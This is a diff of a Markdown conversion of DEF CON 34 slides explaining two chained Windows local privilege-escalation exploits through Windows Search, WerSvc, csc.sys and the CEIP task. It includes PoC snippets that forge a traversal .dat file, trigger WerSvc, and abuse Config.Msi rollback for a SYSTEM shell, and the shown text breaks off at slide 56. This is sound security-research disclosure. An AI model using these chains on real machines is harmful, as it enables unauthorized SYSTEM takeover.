@@ -4,17 +4,21 @@ speakers: ["Bocheng Xiang", "HeeChan Kim"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Bocheng Xiang, HeeChan Kim - Chaining Logical Bugs for Reliable Windows LPE - v1.pdf"
 pages: 80
 sha256: "6be02a3601beeb3f3831590ff9711c6b2f392d8aaf14d879013191cbbe9a6d1f"
-text_chars: 56527
+text_chars: 57003
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-12T00:14:00Z"
+converted_at: "2026-08-12T06:23:01Z"
 ---
 # Chaining Logical Bugs for Reliable Windows LPE
 
@@ -22,34 +26,35 @@ converted_at: "2026-08-12T00:14:00Z"
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Bocheng Xiang, HeeChan Kim - Chaining Logical Bugs for Reliable Windows LPE - v1.pdf` (80 pages)
 
+
 ## Slide 1
 
-```
+\```
 DEF CON 34·  MAIN STAGE  ·  LAS VEGAS
-```
+\```
 
 # **Chaining Logical Bugs for Reliable Windows LPE**
 
 _Turning “that’s probably low impact” into a working SYSTEM exploit._
 
-```
+\```
 heegong@defcon: ~
-```
+\```
 
 **HeeChan Kim** `@heegong123` TeamH4C  ·  Soongsil University
 
-```
+\```
 C:\Users\heegong> whoami
 nt authority\system
-```
+\```
 
-```
+\```
 DeleteFileW()   ZwCreateKey()   SHDeleteKeyW()   OBJ_FORCE_ACCESS_CHECK   Performance\Library   S-1-5-18
-```
+\```
 
-```
+\```
 01
-```
+\```
 
 ## Slide 2
 
@@ -59,29 +64,29 @@ DeleteFileW()   ZwCreateKey()   SHDeleteKeyW()   OBJ_FORCE_ACCESS_CHECK   Perfor
 
 **HeeChan Kim** `@heegong123` Windows LPE & logic-bug researcher — I turn bugs Microsoft rates **“low”** into **SYSTEM** .
 
-```
+\```
 heegong@defcon: ~/whoami
-```
+\```
 
-```
+\```
 PS C:\> whoami /all
-```
+\```
 
-```
+\```
 GROUPS
-```
+\```
 
-```
+\```
 // career
-```
+\```
 
 - **`POC 2025`** speaker — Full-Chain Windows LPE
 
-```
+\```
 Windows Internals    On
 Logic Bug Enjoyer    On
 Reads Config.Msi 4FunOn
-```
+\```
 
 - **`RE//verse 2026`** speaker
 
@@ -89,28 +94,28 @@ Reads Config.Msi 4FunOn
 
 - **`MSRC`** acknowledged · multiple Windows CVEs
 
-```
+\```
 PRIVILEGES
-```
+\```
 
-```
+\```
 SeChainBugsPrivilege On
 SeSymlinkPrivilege   On
-```
+\```
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 02
-```
+\```
 
 ## Slide 3
 
-```
+\```
 C:\> type agenda.txt
-```
+\```
 
 #### **Agenda**
 
@@ -122,13 +127,13 @@ C:\> type agenda.txt
 
 **Patches  ·  scoreboard  ·  takeaways** **`04`** `how each chain dies — why you can’t just route around the fix`
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 03
-```
+\```
 
 ## Slide 4
 
@@ -136,19 +141,19 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 _Why logic bugs quietly win — and how to read a bug like an attacker._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 04
-```
+\```
 
 ## Slide 5
 
-```
+\```
 C:\> id   #  standard user · no admin
-```
+\```
 
 **The gap we cross — user → SYSTEM** _No UAC prompt. No shellcode, ROP, or spray — we climb it with logic alone._
 
@@ -158,43 +163,43 @@ privilege boundary
 
 The classic path across it got expensive. **Two “low-impact” bugs, chained, are all it takes.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 05
-```
+\```
 
 ## Slide 6
 
-```
+\```
 C:\> dir .\mitigations\
-```
+\```
 
 **Memory corruption got expensive** _A decade of mitigations raised the cost of the classic path._
 
-```
+\```
 CFG / XFGCET shadow stackkCFG
 Kernel CFGType isolationArb-write hardening
-```
+\```
 
-```
+\```
 VBS / HVCI
 Pool hardening
-```
+\```
 
 Meanwhile, a quieter bug class shrugs all of it off: **logic flaws in privileged components**
 
 No ROP. No infoleak. No spray. Just Windows components trusting the wrong string, handle, or registry key.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 06
-```
+\```
 
 ## Slide 7
 
@@ -222,13 +227,13 @@ STICKY
 
 And they pay: **`Windows LPE bounties $2k–$20k+`** — a reliable SYSTEM primitive is worth real money.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 07
-```
+\```
 
 ## Slide 8
 
@@ -250,13 +255,13 @@ as SYSTEM · target you pick
 
 Each one, on its own, gets triaged **“low-sev / won’t fix”** — no code exec, no direct EoP. So MSRC shrugs, and the bug lives on.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 08
-```
+\```
 
 ## Slide 9
 
@@ -274,31 +279,31 @@ another “won’t fix” bug
 
 Every step is a Windows feature working **as designed** — just never meant to run together.  This talk = **`2 chains, 4 bugs, 0 memory corruption.`**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 09
-```
+\```
 
 ## Slide 10
 
 **`C:\> .\chain1\run.exe` Chain #1  ·  Service-Level LPE** _Two service bugs, useless alone — chained into deterministic SYSTEM._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 10
-```
+\```
 
 ## Slide 11
 
-```
+\```
 C:\> sc query WSearch
-```
+\```
 
 ###### **Windows Search — CVE-2024-30033**
 
@@ -310,21 +315,21 @@ C:\> sc query WSearch
 
 - **›** Loads IpsPlugin.dll on startup — the real surface
 
-```
+\```
 > tasklist /svc | findstr Search
 SearchIndexer.exe   WSearch
 loads:
-```
+\```
 
-```
+\```
 ...\System32\IpsPlugin.dll
-```
+\```
 
 - **›** Reads a state file from **user-writable** profile dirs
 
-```
+\```
 reads:
-```
+\```
 
 - **›** A SYSTEM service, parsing a file **we fully control**
 
@@ -332,13 +337,13 @@ reads:
 
 - **›** What it does with that file is the whole talk →
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 11
-```
+\```
 
 ## Slide 12
 
@@ -358,13 +363,13 @@ reads TextHarvester.dat → DeleteFileW()
 
 Two leaf calls are the **entire** vuln surface — **“if my file parsed, delete my file.”**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 12
-```
+\```
 
 ## Slide 13
 
@@ -376,13 +381,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`this+48`** The parsed table (with our UsernamePath) is handed straight to the delete routine.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 13
-```
+\```
 
 ## Slide 14
 
@@ -427,19 +432,19 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 - **`[2]`** CUserId::Load streams our file bytes in. Its return becomes the whole function’s return.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 14
-```
+\```
 
 ## Slide 15
 
-```
+\```
 C:\> hexdump -C TextHarvester.dat
-```
+\```
 
 ###### **The .dat file — one field we control**
 
@@ -451,13 +456,13 @@ _The whole format is just filler around a single attacker-controlled path._
 
 our path, spliced in with no filter → traversal
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 15
-```
+\```
 
 ## Slide 16
 
@@ -477,13 +482,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 - **`[3]`** Reads UsernamePath straight off disk into this+4 — no backslash filter, no canonicalization. This one line is the whole bug.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 16
-```
+\```
 
 ## Slide 17
 
@@ -541,13 +546,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`any fail`** One failed read aborts the parse and the delete never fires.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 17
-```
+\```
 
 ## Slide 18
 
@@ -567,13 +572,13 @@ _Same Initialize, two children: we’ve read the file; now we follow the delete.
 
 The value we planted in the .dat is now handed to the delete path — **a SYSTEM file op we steer.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 18
-```
+\```
 
 ## Slide 19
 
@@ -600,13 +605,13 @@ path; DeleteFileW then runs as
 SYSTEM on it. The money line.
 13 }
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 19
-```
+\```
 
 ## Slide 20
 
@@ -614,7 +619,7 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **The unsanitized join (the sink)**
 
-```
+\```
 IpsPlugin.dll  —CUserProfilePathBuilder::SetUser()
 1bool__fastcallCUserProfilePathBuilder::SetUser(
 2CUserProfilePathBuilder*this,constunsigned__int16*a2)
@@ -628,7 +633,7 @@ IpsPlugin.dll  —CUserProfilePathBuilder::SetUser()
 10s_wszLocalAppDataRelativePath);
 11...
 12}
-```
+\```
 
 **`a2`** The second %s is exactly the string we wrote into the .dat, byte for byte.
 
@@ -636,13 +641,13 @@ IpsPlugin.dll  —CUserProfilePathBuilder::SetUser()
 
 - **`=>`** Because a2 may contain \ , we extend the path into any directory we own.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 20
-```
+\```
 
 ## Slide 21
 
@@ -660,55 +665,55 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`=>`** Once this returns true, control falls straight to DeleteFileW.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 21
-```
+\```
 
 ## Slide 22
 
-```
+\```
 C:\> dir /a  C:\Users\user\TempData\...
-```
+\```
 
 ###### **The path we get to steer**
 
-```
+\```
 template
-```
+\```
 
-```
+\```
 C:\Users\%UsernamePath%\AppData\Local\...\TextHarvester\WaitList.dat
-```
+\```
 
-```
+\```
 benign (single component)
-```
+\```
 
-```
+\```
 C:\Users\user\AppData\Local\...\TextHarvester\WaitList.dat
-```
+\```
 
-```
+\```
 attacker (\NOT filtered)
-```
+\```
 
-```
+\```
 C:\Users\user\TempData\AppData\Local\...\TextHarvester\WaitList.dat
-```
+\```
 
 UsernamePath can itself contain **`\`** , so we choose the entire directory chain and land the path in a folder we own at every level. **Now both directories are ours — the classic setup for a symlink swap.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 22
-```
+\```
 
 ## Slide 23
 
@@ -720,13 +725,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **license.rtf** SYSTEM-owned
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 23
-```
+\```
 
 ## Slide 24
 
@@ -734,9 +739,9 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **PoC — forging TextHarvester.dat**
 
-```
+\```
 make_dat.py
-```
+\```
 
 - `1 sid  = 'S-1-5-18'.encode('utf-16le') + b'\x00\x00'`
 
@@ -758,19 +763,19 @@ make_dat.py
 
 - `10 data += p32(0) # [9] read because header == 0xC8 11 data += p32(0)*5 # [10] 20-byte blob 12 data += p32(3) # [11] tail 13 open('TextHarvester.dat','wb').write(data)`
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 24
-```
+\```
 
 ## Slide 25
 
-```
+\```
 C:\> arbitrary delete →EoP
-```
+\```
 
 ###### **Arbitrary delete is basically SYSTEM**
 
@@ -778,48 +783,48 @@ _The well-known Config.Msi / installer-rollback trick  (h/t ZDI · Abdelhamid Na
 
 - **`1`** Windows Installer (SYSTEM) writes rollback .rbs into C:\Config.Msi
 
-```
+\```
 Config.Msi rollback
-```
+\```
 
 - **`2`** Use the delete primitive to remove the protected C:\Config.Msi
 
-```
+\```
 delete  C:\Config.Msi
 mkdir   C:\Config.Msi
 write   evil.rbs
-```
+\```
 
 - **`3`** Recreate C:\Config.Msi as us — now we own the ACL
 
-```
+\```
 [rollback fires]
-```
+\```
 
 - **`4`** Plant a malicious .rbs that launches cmd.exe
 
-```
+\```
 C:\> whoami
 nt authority\system
-```
+\```
 
 - **`5`** Abort → Installer rolls back → runs OUR .rbs as SYSTEM → shell
 
 A background AfdToEop thread starts-then-aborts the install to drive the rollback — **deterministic, no race to win.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 25
-```
+\```
 
 ## Slide 26
 
-```
+\```
 C:\> sc stop WSearch   →Access is denied.
-```
+\```
 
 ###### **But… you have to restart WSearch**
 
@@ -835,19 +840,19 @@ A real bug, not a real weapon. We need to force the restart ourselves → **an a
 
 - ✗ The PoC “cheats”: restart it by hand
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 26
-```
+\```
 
 ## Slide 27
 
-```
+\```
 C:\> whoami /groups   # just a normal user
-```
+\```
 
 ###### **The missing piece: a free KILL primitive**
 
@@ -859,13 +864,13 @@ arbitrary file process termination
 
 Where do you get a free arbitrary process-kill as a normal user? **Microsoft hands you one, and won’t take it back.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 27
-```
+\```
 
 ## Slide 28
 
@@ -873,9 +878,9 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **ZDI-24-1098 — WerSvc arbitrary kill**
 
-```
+\```
 ZDI-24-1098 / ZDI-CAN-22870
-```
+\```
 
 - **› WerSvc** (Windows Error Reporting) runs as **SYSTEM ›** It is **missing an authorization check** before granting access
 
@@ -883,46 +888,46 @@ ZDI-24-1098 / ZDI-CAN-22870
 
 - **›** No admin, no SeDebugPrivilege, no special group
 
-```
+\```
 Missing Authorization →
 Arbitrary Process Termination
-```
+\```
 
-```
+\```
 CVSS  : 5.5(…/A:H)
 Vendor: Microsoft · Windows
 Caller: low-priv local user
 Impact: terminate ANY pid
 Status: won’t fix · UNPATCHED
-```
+\```
 
 - **›** Microsoft’s verdict: **“won’t fix”**
 
 - **›** → publicly disclosed and **still unpatched today**
 
-```
+\```
 a free, reusable KILL
-```
+\```
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 28
-```
+\```
 
 ## Slide 29
 
-```
+\```
 C:\> sc qc WSearch   # START_TYPE : 2  AUTO_START
-```
+\```
 
 ###### **Why a KILL unlocks Chain #1**
 
-```
+\```
 BEFORE
-```
+\```
 
 `run exp.exe  →` **`[ wait ??? ]`** `→ WSearch happens to restart  → delete fires` _flaky, slow, depends on luck_
 
@@ -936,13 +941,13 @@ BEFORE
 
 **`4.`** `CConnectionWaitList::Load → arbitrary DELETE fires on the restart`
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 29
-```
+\```
 
 ## Slide 30
 
@@ -960,7 +965,7 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 - **›** Emit that provider’s event → SCM starts WerSvc for us
 
-```
+\```
 sc qtriggerinfo wersvc
 C:\> sc qtriggerinfo wersvc
 [SC] QueryServiceConfig2 OK
@@ -970,15 +975,15 @@ CUSTOM :
 e46eead8-0c54-4489-
 9898-8fa79d059e0e
 [ETW PROVIDER UUID]
-```
+\```
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 30
-```
+\```
 
 ## Slide 31
 
@@ -998,13 +1003,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`=>`** Windows itself calls this to start WerSvc on demand — and none of it needs privilege.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 31
-```
+\```
 
 ## Slide 32
 
@@ -1012,9 +1017,9 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **Reproduce it — start WerSvc yourself**
 
-```
+\```
 start_wersvc  —emit the ETW trigger
-```
+\```
 
 - `1 // WNF_WER_SERVICE_START state name (8 bytes) 2 CHAR wnf[] = { 0x75,0x08,0xBC,0xA3,0x3A,0x0B,0x94,0x41 }; 3 ZwQueryWnfStateNameInformation(wnf, 1, 0, &info, sizeof(info)); 4 ZwUpdateWnfStateData(wnf, 0,0,0,0,0); 5 6 GUID g; // WerSvc start-trigger provider`
 
@@ -1034,13 +1039,13 @@ start_wersvc  —emit the ETW trigger
 
 **`write`** EtwEventWriteNoRegistration writes the trigger event → SCM starts WerSvc as SYSTEM → its ALPC server comes up → the kill is reachable.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 32
-```
+\```
 
 ## Slide 33
 
@@ -1048,9 +1053,9 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **The kill — where the missing check matters**
 
-```
+\```
 wersvc  —CHungApp::Report()  (hang-report path)
-```
+\```
 
 - `1 // ALPC requestCode 0x10000000  ->  SvcReportHang`
 
@@ -1062,9 +1067,9 @@ wersvc  —CHungApp::Report()  (hang-report path)
 
 - `5 CHungApp::Report(msg);`
 
-```
+\```
 6
-```
+\```
 
 - `7 hProc = OpenProcess(0x100611, FALSE, msg->pid); // attacker-chosen pid`
 
@@ -1078,13 +1083,13 @@ wersvc  —CHungApp::Report()  (hang-report path)
 
 **`no check`** So, is there a check for this PID?  No. A low-priv user gets SYSTEM to TerminateProcess any PID.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 33
-```
+\```
 
 ## Slide 34
 
@@ -1103,13 +1108,13 @@ OpenProcess + Terminate, SYSTEM
 
 **Root cause:** the hang-report path opens and kills whatever PID the caller sends, and never checks the caller is allowed to touch that process. A SYSTEM terminate with no gate — reachable by anyone.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 34
-```
+\```
 
 ## Slide 35
 
@@ -1119,17 +1124,17 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 _The kill stops WSearch. Instead of waiting for it to come back, we open its COM object and it starts again at once._
 
-```
+\```
 start_wsearch  —open the Search Manager
-```
+\```
 
-```
+\```
 // WSearch is killed —now start it, no waiting
 ISearchManager*mgr = nullptr;
 CoCreateInstance(CLSID_CSearchManager,
 nullptr, CLSCTX_ALL, IID_ISearchManager,
 (void**)&mgr);
-```
+\```
 
 **`any user`** Creating this COM object needs no admin rights.
 
@@ -1137,29 +1142,29 @@ nullptr, CLSCTX_ALL, IID_ISearchManager,
 
 **`no wait`** It re-reads our .dat right away, so the delete fires now, not on a timer.
 
-```
+\```
 // DCOM starts WSearch as SYSTEM  ->  re-reads
-```
+\```
 
-```
+\```
 //   our .dat  ->  DeleteFileW fires now
-```
+\```
 
 So the restart is on our schedule, not luck. **Kill, connect, done.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 35
-```
+\```
 
 ## Slide 36
 
-```
+\```
 C:\> ./chain1.exe   # standard user →SYSTEM
-```
+\```
 
 ###### **Chain #1 — assembled**
 
@@ -1173,13 +1178,13 @@ CVE-2024-30033 ETW trigger ZDI-24-1098 no wait as SYSTEM → shell
 
 ###### Two “low-impact” service bugs → **a reliable SYSTEM weapon.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 36
-```
+\```
 
 ## Slide 37
 
@@ -1189,13 +1194,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 standard user → KILL WSearch → force-start → DELETE → **SYSTEM** (first try)
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 37
-```
+\```
 
 ## Slide 38
 
@@ -1203,25 +1208,25 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 _A kernel driver and a SYSTEM scheduled task, tricked into building a registry key we own._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 38
-```
+\```
 
 ## Slide 39
 
 ###### **`C:\> git blame  chain2/` Full disclosure — Chain #2 isn’t mine** _Credit where it’s due before we dig in._
 
-```
+\```
 CHAIN #1
-```
+\```
 
-```
+\```
 CHAIN #2
-```
+\```
 
 ###### **Windows Search  +  WerSvc**
 
@@ -1229,13 +1234,13 @@ CHAIN #2
 
 **csc.sys  +  CEIP task** `CVE-2025-60705 · CVE-2025-59512` found & shared — huge thanks **Tianlin Zhang** `@t0zhang`
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 39
-```
+\```
 
 ## Slide 40
 
@@ -1249,13 +1254,13 @@ CSC (Offline Files) caches network shares locally so they survive a dropped conn
 
 **csc.sys** kernel · rdbss mini-rdr
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 40
-```
+\```
 
 ## Slide 41
 
@@ -1300,13 +1305,13 @@ confused-deputy defense. The
 omission is the bug — 8 slides
 down.|
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 41
-```
+\```
 
 ## Slide 42
 
@@ -1324,13 +1329,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`still us`** Still in usermode cscsvc.dll, still impersonating. Pure marshalling before the hand-off to the driver.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 42
-```
+\```
 
 ## Slide 43
 
@@ -1357,13 +1362,13 @@ cscsvc.dll  — CscDriverRebootRenameAddEntry()
 
 **`[4]`** Thin wrapper over NtFsControlFile — crosses into csc.sys STILL impersonating. The IRP carries our token.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 43
-```
+\```
 
 ## Slide 44
 
@@ -1379,13 +1384,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 - `10 ... 11 }`
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 44
-```
+\```
 
 ## Slide 45
 
@@ -1403,19 +1408,19 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`2 * 13 = 26`** MajorFunction 13 is IRP_MJ_FILE_SYSTEM_CONTROL and slot 26 holds its handler RxCommonFileSystemControl so it looks off-by-one until you know the slots are paired.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 45
-```
+\```
 
 ## Slide 46
 
-```
+\```
 C:\> windbg> k   (rdbss →csc)
-```
+\```
 
 **Through rdbss, back into csc** _RDBSS owns the generic FSCTL framing; CSC owns the semantics — and the bug._
 
@@ -1427,13 +1432,13 @@ into CSC’s own code — the bug
 
 **Still** in the **impersonated** (user) context From CscFsCtl on, every function is CSC’s own code.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 46
-```
+\```
 
 ## Slide 47
 
@@ -1441,7 +1446,7 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **Is this one of our internal FSCTLs?**
 
-```
+\```
 csc.sys  —CscFsCtl / CscDclIsInternalFsControl()
 1__int64__fastcallCscFsCtl(PMRX_FCBFcb){
 2if(CscDclIsInternalFsControl(Fcb))// gate
@@ -1454,7 +1459,7 @@ csc.sys  —CscFsCtl / CscDclIsInternalFsControl()
 9if(*(_BYTE*)v2 ==13&&!*(_BYTE*)(v2 +1))
 10return*(_DWORD*)(v2 +24)==0x901AF;// fsctl code
 11}
-```
+\```
 
 **`gate`** Checks MajorFunction 13, minor 0, and FsControlCode == 0x901AF.
 
@@ -1462,13 +1467,13 @@ csc.sys  —CscFsCtl / CscDclIsInternalFsControl()
 
 **`=>`** We enter CscDclInternalFsControl, the opcode switch where 52 lives.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 47
-```
+\```
 
 ## Slide 48
 
@@ -1488,13 +1493,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`length-only`** Paths are length-checked, never privilegechecked. They now feed the registry logic.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 48
-```
+\```
 
 ## Slide 49
 
@@ -1516,13 +1521,13 @@ csc.sys  — CscDclMRxRebootRenameAdd()
 
 **`→ AddEntry`** …which builds the two hard-coded CSC registry paths and calls the buggy OpenKey helper (next slides).
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 49
-```
+\```
 
 ## Slide 50
 
@@ -1538,13 +1543,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`[7]`** IsValidRename only checks the strings are UNC paths (why the PoC uses \\SMB\...). Not a privilege check. **`[8][9]`** Line [9] CscRebootRenamepAddToKey ultimately calls the SAME helper (CscRebootRenamepOpenKey) internally — that helper is the bug.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 50
-```
+\```
 
 ## Slide 51
 
@@ -1571,33 +1576,33 @@ csc.sys  — CscRebootRenamepOpenKey()
 
 **`ZwCreateKey`** NULL SD → the new key’s owner = the creating thread’s token. That thread impersonates US → a SYSTEMservice key ends up owned by the user.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 51
-```
+\```
 
 ## Slide 52
 
 ###### **`C:\> whoami  (impersonated context, top to bottom)` Why the owner becomes the user**
 
-```
+\```
 RenameItem —Impersonate(client) →token = USER
-```
+\```
 
 **`FSCTL 0x901AF … rdbss … case 52  (never reverted) CscRebootRenamepOpenKey → ZwCreateKey(SD=NULL) new key owner  ==  USER`** ✓
 
 Both must hold: **`no OBJ_FORCE_ACCESS_CHECK`** + **`NULL SecurityDescriptor`** → the kernel takes the new key’s owner straight from the impersonated request token.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 52
-```
+\```
 
 ## Slide 53
 
@@ -1605,7 +1610,7 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **The RebootRename subkey — same bug**
 
-```
+\```
 csc.sys  —CscRebootRenamepAddToKey()
 1__int64__fastcallCscRebootRenamepAddToKey(
 2struct_UNICODE_STRING*a1,HANDLE*a2,unsignedint*a3,
@@ -1615,15 +1620,15 @@ csc.sys  —CscRebootRenamepAddToKey()
 6IndexString=CscRebootRenamepOpenKey(&Handle,a1,1,v16);// [9] same helper
 7...
 8}
-```
+\```
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 53
-```
+\```
 
 ## Slide 54
 
@@ -1633,27 +1638,27 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 We OWN **`RebootRename`** → make it a **`REG_OPTION_CREATE_LINK`** symlink → `HKLM\...\Services\Pwn` Re-trigger CVE-2025-60705 → the driver “creates RebootRename” → follows our link → creates **an arbitrary key, owned by us.**
 
-```
+\```
 THE BLOCKER
-```
+\```
 
 On startup, CSC pre-creates `...\CSC\Parameters` as **SYSTEM** . We can’t own it unless it’s deleted first. → we need an arbitrary registry-key **DELETE** `==  CVE-2025-59512`
 
 _(and we’ll delete twice: the pre-made Parameters, then RebootRename — so we can rebuild it as a symlink.)_
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 54
-```
+\```
 
 ## Slide 55
 
-```
+\```
 C:\> type  ...\Consolidator
-```
+\```
 
 ###### **CVE-2025-59512 — the delete we need**
 
@@ -1663,32 +1668,32 @@ C:\> type  ...\Consolidator
 
 - **›** The **Consolidator** scheduled task runs **wsqmcons.exe**
 
-```
+\```
 scheduled task
-```
+\```
 
-```
+\```
 Customer Experience
 Improvement Program
 Tasks\...\Consolidator
-```
+\```
 
 - **›** wsqmcons holds the **delete primitive**
 
 - **›** …and any user can make the task run
 
-```
+\```
 runs: wsqmcons.exe
 as:   S-1-5-18 (SYSTEM)
-```
+\```
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 55
-```
+\```
 
 ## Slide 56
 
@@ -1696,9 +1701,9 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **A SYSTEM task any user can run**
 
-```
+\```
 ...\Customer Experience Improvement Program\Consolidator
-```
+\```
 
